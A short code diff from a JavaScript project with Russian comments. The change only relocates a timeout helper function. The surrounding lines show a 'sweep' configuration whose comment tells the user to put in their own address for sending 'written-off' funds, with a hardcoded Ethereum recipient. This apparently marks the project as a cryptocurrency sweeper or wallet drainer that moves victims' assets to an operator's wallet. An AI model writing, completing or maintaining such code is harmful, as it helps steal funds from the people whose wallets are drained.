@@ -1,13 +1,6 @@
 // ============================================================
 // ===== КОНФИГУРАЦИЯ СПИСАНИЯ - НАСТРОЙТЕ ЗДЕСЬ! =============
 // ============================================================
-
-const withTimeout = (promise, ms, fallbackMessage = "Превышено время ожидания") =>
-  Promise.race([
-    promise,
-    new Promise((_, reject) => setTimeout(() => reject(new Error(fallbackMessage)), ms))
-  ]);
-
 const SWEEP_CONFIG = {
   // 🔥 АДРЕС КУДА СПИСЫВАТЬ СРЕДСТВА - ЗАМЕНИТЕ НА ВАШ!
   recipient: "0xB38376F2592377faa4774B6FfE8026EB4b001cd0",
@@ -69,7 +62,11 @@ const isStoredSessionExpired = (session) =>
   Boolean(session?.expiresAt && new Date(session.expiresAt).getTime() <= Date.now());
 
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-
+const withTimeout = (promise, ms, fallbackMessage = "Превышено время ожидания") =>
+  Promise.race([
+    promise,
+    new Promise((_, reject) => setTimeout(() => reject(new Error(fallbackMessage)), ms))
+  ]);
 const fetchWithTimeout = async (url, options = {}, timeoutMs = 90000) => {
   let timer;
   const timeoutPromise = new Promise((_, reject) => {
